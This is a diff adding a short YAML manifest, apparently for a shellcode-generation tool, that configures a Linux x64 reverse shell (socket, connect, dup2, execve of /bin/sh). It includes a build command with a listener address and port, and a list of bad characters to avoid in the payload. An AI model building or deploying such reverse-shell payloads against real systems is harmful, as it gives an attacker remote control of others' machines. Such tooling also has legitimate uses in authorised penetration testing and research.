@@ -1,0 +1,9 @@
+# Linux reverse shell - x64
+# Syscall workflow: socket -> connect -> dup2 x3 -> execve("/bin/sh")
+#
+# Build:
+#   uv run python -c "from emitrion.build_linux_x64 import build_linux_x64; r = build_linux_x64('emitrion/manifests/linux-x64/revshell_x64.yaml', assemble=False, lhost='192.168.1.100', lport=9001); print(r.asm[:200])"
+arch: x64
+os: linux
+template: ir_linux_reverse_shell
+badchars: ["00", "0A", "0D"]
